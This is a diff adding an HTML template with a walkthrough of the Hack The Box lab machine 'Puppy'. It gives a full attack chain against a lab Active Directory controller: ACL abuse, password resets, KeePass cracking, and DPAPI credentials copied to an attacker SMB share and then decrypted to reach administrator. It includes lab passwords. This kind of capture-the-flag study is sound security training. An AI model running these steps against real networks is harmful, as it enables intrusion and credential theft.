@@ -1,0 +1,443 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB Puppy</h1>
+    <p class="text">Difficulty : Medium | UserDifficulty : 4.7</p>
+    <p class="text"> account: levi.james / KingofAkron2025!</p>
+
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV $IP --min-rate=10000</u>
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-11 19:38:01Z)
+111/tcp   open  rpcbind?
+|_rpcinfo: ERROR: Script execution failed (use -d to debug)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+2049/tcp  open  mountd        1-3 (RPC #100005)
+3260/tcp  open  iscsi?
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49695/tcp open  msrpc         Microsoft Windows RPC
+54762/tcp open  msrpc         Microsoft Windows RPC</code></pre></div>
+
+<p class="text">There is only SMB server we can target. Since we have account levi, it's easily enumeratable.</p>
+<div class="code-box"><pre><code>└─$ crackmapexec smb 10.129.232.75 -u levi.james -p 'KingofAkron2025!' --shares
+SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
+SMB         10.129.232.75   445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
+SMB         10.129.232.75   445    DC               [+] Enumerated shares
+SMB         10.129.232.75   445    DC               Share           Permissions     Remark
+SMB         10.129.232.75   445    DC               -----           -----------     ------
+SMB         10.129.232.75   445    DC               ADMIN$                          Remote Admin
+SMB         10.129.232.75   445    DC               C$                              Default share
+SMB         10.129.232.75   445    DC               DEV                             DEV-SHARE for PUPPY-DEVS
+SMB         10.129.232.75   445    DC               IPC$            READ            Remote IPC
+SMB         10.129.232.75   445    DC               NETLOGON        READ            Logon server share 
+SMB         10.129.232.75   445    DC               SYSVOL          READ            Logon server share </code></pre></div>
+
+<p class="text">Hmm, there is no non-default share we can read. We may know new idea with analyzing the target's AD structure with BloodHound.</p>
+<p class="text">But REMEMBER, there is non-default share named DEV, though we cannot read contents right now.</p>
+<div class="code-box"><pre><code>└─$ bloodhound-python -c all -u levi.james -p 'KingofAkron2025!' -d puppy.htb -ns 10.129.232.75 --zip</code></pre></div>
+<p class="text">After seconds, bloodhound-python generated a zip file. We can feed this zip file to BloodHound.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/puppy/1.png' %}" alt="">
+    <p class="text">BloodHound says the user levi is a member of HR group. We can trace this group...</p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/puppy/2.png' %}" alt="">
+    <p class="text">The HR group has GenericWrite against Developers group. Before, we saw a non-default share named DEV. <br><br>Since we have GenericWrite right, we can join this group and might be able to read DEV share.</p>
+</div>
+<p class="text">We can add ourselves to Developers group with net rpc command.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/puppy]
+└─$ net rpc group addmem DEVELOPERS levi.james -U "puppy.htb"/"levi.james"%"KingofAkron2025\!" -S 10.129.232.75
+                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo/puppy]
+└─$ net rpc group members DEVELOPERS -U "puppy.htb"/"levi.james"%"KingofAkron2025\!" -S 10.129.232.75
+PUPPY\levi.james
+PUPPY\ant.edwards
+PUPPY\adam.silver
+PUPPY\jamie.williams</code></pre></div>
+
+<div class="code-box"><pre><code>└─$ smbclient \\\\puppy.htb\\DEV -U 'levi.james%KingofAkron2025!'
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                  DR        0  Sun Mar 23 03:07:57 2025
+  ..                                  D        0  Sat Mar  8 11:52:57 2025
+  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 03:09:12 2025
+  Projects                            D        0  Sat Mar  8 11:53:36 2025
+  recovery.kdbx                       A     2677  Tue Mar 11 22:25:46 2025
+
+                5080575 blocks of size 4096. 1623429 blocks available
+smb: \> </code></pre></div>
+
+<p class="text">Now we can get into the share! Also we can see there is .kdbx file, which is an encrypted database file format used by the open-source password manager KeePass Password Safe and compatible applications.</p>
+<p class="text">We can use this file to get passwords for target's users.</p>
+
+<div class="code-box"><pre><code>└─$ keepass2john recovery.kdbx > recovery.john                                     
+! recovery.kdbx : File version '40000' is currently not supported!</code></pre></div>
+
+<p class="text">Searching this text output revealed that the john I'm using is out-of-date, and cannot deal with this type of kdbx file. So, we need to use latest version of john.</p>
+<p class="text">We can install it with snap.</p>
+<div class="code-box"><pre><code>└─$ sudo snap install john-the-ripper
+john-the-ripper v1.9.1-ce from Claudio André (claudioandre-br) installed</code></pre></div>
+
+<div class="code-box"><pre><code>└─$ john-the-ripper.keepass2john recovery.kdbx > recovery.kdbx.hash
+recovery:$keepass$*4*37*ef636...</code></pre></div>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/puppy]
+└─$ john-the-ripper recovery.john -wordlist=/usr/share/wordlists/rockyou.txt
+<u>Sorry, AVX is required for this build</u></code></pre></div>
+<p class="text">However, I met AVX promlem.</p>
+<p class="text">According to Google...</p>
+<p class="text"><strong>AVX is</strong> a virtual machine that requires the Advanced Vector Extensions (AVX) instruction set to run, which is a CPU feature used for high-performance computing tasks like video encoding, image processing, and scientific simulations. </p>
+<p class="text">Fxxk!! IDK how to repair this fxxxing problem.</p>
+<p class="text">So, I gave up to use this version and decided to install latest john from git.</p>
+<div class="code-box"><pre><code>└─$ git clone https://github.com/openwall/john.git
+└─$ cd john/src
+└─$ ./configure --disable-simd
+└─$ make -s clean        
+└─$ make -s
+└─$ cd ../run</code></pre></div>
+<p class="text">I installed john on the first line, and construct it on 2~5 lines.</p>
+<p class="text">The keepass2john is generated under the /run directory.</p>
+
+<p class="text">Only I have to do is I can use this john for cracking kdbx file.</p>
+<div class="code-box"><pre><code>└─$ ./keepass2john ~/tempo/puppy/recovery.kdbx > ../../keepass_v4.hash
+
+└─$ ./john --format=KeePass --wordlist=/usr/share/wordlists/rockyou.txt ../../keepass_v4.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [AES/Argon2 32/64])
+Cost 1 (t (rounds)) is 37 for all loaded hashes
+Cost 2 (m) is 65536 for all loaded hashes
+Cost 3 (p) is 4 for all loaded hashes
+Cost 4 (KDF [0=Argon2d 2=Argon2id 3=AES]) is 0 for all loaded hashes
+Will run 5 OpenMP threads
+Note: Passwords longer than 41 [worst case UTF-8] to 124 [ASCII] rejected
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+Failed to use huge pages (not pre-allocated via sysctl? that's fine)
+<u>liverpool</u>        (recovery)     
+1g 0:00:00:12 DONE (2025-11-11 08:52) 0.08292g/s 3.317p/s 3.317c/s 3.317C/s liverpool..123123
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed</code></pre></div>
+
+<p class="text">I made it...! However, I need to install keepassxc to load the kdbx file itself this time. I wish I can install it successfully.</p>
+
+<div class="code-box"><pre><code>└─$ sudo apt install -y keepassxc
+└─$ keepassxc-cli export --format csv recovery.kdbx > recovery.csv
+Enter password to unlock recovery.kdbx: 
+└─$ cat recovery.csv                                                           
+"Group","Title","Username","Password","URL","Notes","TOTP","Icon","Last Modified","Created"
+"Root","JAMIE WILLIAMSON","","JamieLove2025!","puppy.htb","","","0","2025-03-10T08:57:58Z","2025-03-10T08:57:01Z"
+"Root","ADAM SILVER","","HJKL2025!","puppy.htb","","","0","2025-03-10T09:01:02Z","2025-03-10T08:58:07Z"
+"Root","ANTONY C. EDWARDS","","Antman2025!","puppy.htb","","","0","2025-03-10T09:00:02Z","2025-03-10T08:58:46Z"
+"Root","STEVE TUCKER","","Steve2025!","puppy.htb","","","0","2025-03-10T09:03:48Z","2025-03-10T09:01:26Z"
+"Root","SAMUEL BLAKE","","ILY2025!","puppy.htb","","","0","2025-03-10T09:03:39Z","2025-03-10T09:02:03Z"</code></pre></div>
+
+<p class="text">Yeah it worked. We need to check these users exist.</p>
+
+<div class="code-box"><pre><code>└─$ crackmapexec smb 10.129.232.75 -u levi.james -p 'KingofAkron2025!' --users | grep -oP '(?i)(?<=PUPPY.HTB\\)[^:\s\)\\]+'
+levi.james
+steph.cooper_adm
+steph.cooper
+jamie.williams
+adam.silver
+ant.edwards
+levi.james
+krbtgt
+Guest
+Administrator</code></pre></div>
+
+<p class="text">We got users credentials : <br>jamie.williams : JamieLove2025! <br>adam.silver : HJKL2025! <br>ant.edwards : Antman2025!</p>
+<p class="text">It's possible that some of passwords are changed. Let's check.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/puppy]
+└─$ crackmapexec smb puppy.htb -u ant.edwards -p 'Antman2025!'                                                             
+SMB         puppy.htb       445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
+SMB         puppy.htb       445    DC               [+] PUPPY.HTB\ant.edwards:Antman2025! 
+                                                                                                                                                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo/puppy]
+└─$ crackmapexec smb puppy.htb -u adam.silver -p 'HJKL2025!'                                                               
+SMB         puppy.htb       445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
+SMB         puppy.htb       445    DC               [-] PUPPY.HTB\adam.silver:HJKL2025! STATUS_LOGON_FAILURE 
+                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo/puppy]
+└─$ crackmapexec smb puppy.htb -u jamie.williams -p 'JamieLove2025!'
+SMB         puppy.htb       445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
+SMB         puppy.htb       445    DC               [-] PUPPY.HTB\jamie.williams:JamieLove2025! STATUS_LOGON_FAILURE </code></pre></div>
+
+<p class="text">Only ant.edwards' password is valid.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/puppy/3.png' %}" alt="">
+    <p class="text">The user ant.edwards has GenericAll right against adam.silver through the Senior Developer.</p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/puppy/4.png' %}" alt="">
+    <p class="text">Additionally, the adam.silver has Remote Management Users membership, which let us to use evil-winrm.</p>
+</div>
+
+<p class="text">Since we have GenericAll privilege, we can change password for adam.silver and get interaction with PowerShell via evil-winrm!</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/puppy]
+└─$ bloodyAD --host 10.129.232.75 -d puppy.htb -u ant.edwards -p 'Antman2025!' set password 'adam.silver' 'pwn123!'
+[+] Password changed successfully!
+                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo/puppy]
+└─$ crackmapexec smb puppy.htb -u adam.silver -p 'pwn123!'          
+SMB         puppy.htb       445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
+SMB         puppy.htb       445    DC               [-] PUPPY.HTB\adam.silver:pwn123! <u>STATUS_ACCOUNT_DISABLED</u> </code></pre></div>
+<p class="text">Thouhg the user is disabled, we have GenericAll. Just remove this setting.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/puppy]
+└─$ bloodyAD --host 10.129.232.75 -d puppy.htb -u ant.edwards -p 'Antman2025!' remove uac 'adam.silver' -f ACCOUNTDISABLE
+[-] ['ACCOUNTDISABLE'] property flags removed from adam.silver's userAccountControl
+                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo/puppy]
+└─$ crackmapexec smb puppy.htb -u adam.silver -p 'pwn123!'                                                               
+SMB         puppy.htb       445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
+SMB         puppy.htb       445    DC               [+] PUPPY.HTB\adam.silver:pwn123! </code></pre></div>
+
+<p class="text">We successfully pwned adam.silver user!</p>
+
+<div class="code-box"><pre><code>└─$ evil-winrm -i puppy.htb -u adam.silver -p 'pwn123!'                         
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\adam.silver\Documents> </code></pre></div>
+
+<h2 class="subtitle">Lateral Movement</h2>
+<p class="text">Under the root directory, I found Backup folder.</p>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\> dir
+
+
+    Directory: C:\
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----          5/9/2025  10:48 AM                <u>Backups</u>
+d-----         5/12/2025   5:21 PM                inetpub
+d-----          5/8/2021   1:20 AM                PerfLogs
+d-r---         7/24/2025  12:30 PM                Program Files
+d-----          5/8/2021   2:40 AM                Program Files (x86)
+d-----          3/8/2025   9:00 AM                StorageReports
+d-r---        11/12/2025   3:29 AM                Users
+d-----         5/13/2025   4:40 PM                Windows</code></pre></div>
+
+<p class="text">Also there is zip file.</p>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Backups> ls -force
+
+
+    Directory: C:\Backups
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip</code></pre></div>
+
+<p class="text">Let's install it and analyze contents!</p>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Backups> download site-backup-2024-12-30.zip</code></pre></div>
+<div class="code-box"><pre><code>└─$ unzip site-backup-2024-12-30.zip</code></pre></div>
+
+<p class="text">Then, several files were inflated and generated puppy folder.</p>
+<div class="code-box"><pre><code>└─$ ls
+assets  images  index.html  nms-auth-config.xml.bak</code></pre></div>
+<p class="text">Under the folder puppy, I found interesting file. It might contain sensitive information.</p>
+<div class="code-box"><pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;ldap-config&gt;
+    &lt;server&gt;
+        &lt;host&gt;DC.PUPPY.HTB&lt;/host&gt;
+        &lt;port&gt;389&lt;/port&gt;
+        &lt;base-dn&gt;dc=PUPPY,dc=HTB&lt;/base-dn&gt;
+        &lt;bind-dn&gt;cn=<u>steph.cooper</u>,dc=puppy,dc=htb&lt;/bind-dn&gt;
+        &lt;bind-password&gt;<u>ChefSteph2025!</u>&lt;/bind-password&gt;
+    &lt;/server&gt;
+    &lt;user-attributes&gt;
+        &lt;attribute name="username" ldap-attribute="uid" /&gt;
+        &lt;attribute name="firstName" ldap-attribute="givenName" /&gt;
+        &lt;attribute name="lastName" ldap-attribute="sn" /&gt;
+        &lt;attribute name="email" ldap-attribute="mail" /&gt;
+    &lt;/user-attributes&gt;
+    &lt;group-attributes&gt;
+        &lt;attribute name="groupName" ldap-attribute="cn" /&gt;
+        &lt;attribute name="groupMember" ldap-attribute="member" /&gt;
+    &lt;/group-attributes&gt;
+    &lt;search-filter&gt;
+        &lt;filter&gt;(&(objectClass=person)(uid=%s))&lt;/filter&gt;
+    &lt;/search-filter&gt;
+&lt;/ldap-config&gt;
+</code></pre></div>
+<p class="text">There is credential for steph.cooper</p>
+
+<div class="code-box"><pre><code>└─$ crackmapexec smb puppy.htb -u steph.cooper -p 'ChefSteph2025!'
+SMB         puppy.htb       445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
+SMB         puppy.htb       445    DC               [+] PUPPY.HTB\steph.cooper:ChefSteph2025! </code></pre></div>
+
+<p class="text">Perfect. We can check also steph.cooper has Remote Desktop execution right. Let's use evil-winrm again.</p>
+
+<div class="code-box"><pre><code>└─$ evil-winrm -i puppy.htb -u steph.cooper -p 'ChefSteph2025!'                     
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\steph.cooper\Documents> </code></pre></div>
+<p class="text">Here, it is.</p>
+
+
+
+<h2 class="subtitle">PrivEsc</h2>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\steph.cooper\appdata\Roaming\Microsoft> dir
+
+
+    Directory: C:\Users\steph.cooper\appdata\Roaming\Microsoft
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d---s-          3/8/2025   7:53 AM                Credentials
+d---s-          3/8/2025   7:40 AM                Crypto
+d-----          3/8/2025   7:40 AM                Internet Explorer
+d-----          3/8/2025   7:40 AM                Network
+d---s-          3/8/2025   7:40 AM                Protect
+d-----          5/8/2021   1:20 AM                Spelling
+d---s-         2/23/2025   2:35 PM                SystemCertificates
+d-----         2/23/2025   2:36 PM                Vault
+d-----          3/8/2025   7:52 AM                Windows</code></pre></div>
+<p class="text">Under the path C:\Users\steph.cooper\appdata\Roaming\Microsoft, I found Credentials and Protect folder.</p>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\steph.cooper\appdata\Roaming\Microsoft\Credentials> ls -force
+
+
+    Directory: C:\Users\steph.cooper\appdata\Roaming\Microsoft\Credentials
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a-hs-          3/8/2025   7:54 AM            414 <u>C8D69EBE9A43E9DEBF6B5FBD48B521B9</u>
+
+
+*Evil-WinRM* PS C:\Users\steph.cooper\appdata\Roaming\Microsoft\protect\S-1-5-21-1487982659-1829050783-2281216199-1107> ls -force 
+
+
+    Directory: C:\Users\steph.cooper\appdata\Roaming\Microsoft\protect\S-1-5-21-1487982659-1829050783-2281216199-1107
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a-hs-          3/8/2025   7:40 AM            740 <u>556a2412-1275-4ccf-b721-e6a0b4f90407</u>
+-a-hs-         2/23/2025   2:36 PM             24 Preferred</code></pre></div>
+
+<p class="text">They are master key and credential file. We can decode them using impacket-dpapi!</p>
+<p class="text">Since evil-winrm cannot download these files somehow, I used impacket-smbserver.</p>
+
+<div class="code-box"><pre><code>└─$ impacket-smbserver share . -smb2support -username a -password a</code></pre></div>
+
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\steph.cooper\appdata\Roaming\Microsoft\protect\S-1-5-21-1487982659-1829050783-2281216199-1107> net use \\10.10.16.38\share /user:a a
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\steph.cooper\appdata\Roaming\Microsoft\protect\S-1-5-21-1487982659-1829050783-2281216199-1107> copy 556a
+2412-1275-4ccf-b721-e6a0b4f90407 \\10.10.16.38\share
+
+*Evil-WinRM* PS C:\Users\steph.cooper\appdata\Roaming\Microsoft\credentials> copy C8D69EBE9A43E9DEBF6B5FBD48B521B9 \\10.10.16.38\
+share</code></pre></div>
+
+<p class="text">Then, on our local machine,</p>
+<div class="code-box"><pre><code>└─$ <u>impacket-dpapi masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'</u>
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[MASTERKEYFILE]
+Version     :        2 (2)
+Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
+Flags       :        0 (0)
+Policy      : 4ccf1275 (1288639093)
+MasterKeyLen: 00000088 (136)
+BackupKeyLen: 00000068 (104)
+CredHistLen : 00000000 (0)
+DomainKeyLen: 00000174 (372)
+
+Decrypted key with User Key (MD4 protected)
+Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84</code></pre></div>
+
+<div class="code-box"><pre><code>└─$ <u>impacket-dpapi credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84</u>
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[CREDENTIAL]
+LastWritten : 2025-03-08 15:54:29+00:00
+Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
+Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
+Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
+Target      : Domain:target=PUPPY.HTB
+Description : 
+Unknown     : 
+Username    : steph.cooper_adm
+Unknown     : <u>FivethChipOnItsWay2025!</u></code></pre></div>
+
+<div class="code-box"><pre><code>└─$ evil-winrm -i puppy.htb -u steph.cooper_adm -p 'FivethChipOnItsWay2025!'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\steph.cooper_adm\Documents> net user steph.cooper_adm
+User name                    steph.cooper_adm
+Full Name                    Stephen A. Cooper
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            3/8/2025 7:50:40 AM
+Password expires             Never
+Password changeable          3/9/2025 7:50:40 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators
+Global Group memberships     *Domain Users
+The command completed successfully.</code></pre></div>
+
+<p class="text">Since we are Administrator, we can see root.txt.</p>
+
+└─$ 
+</body>
+</html>
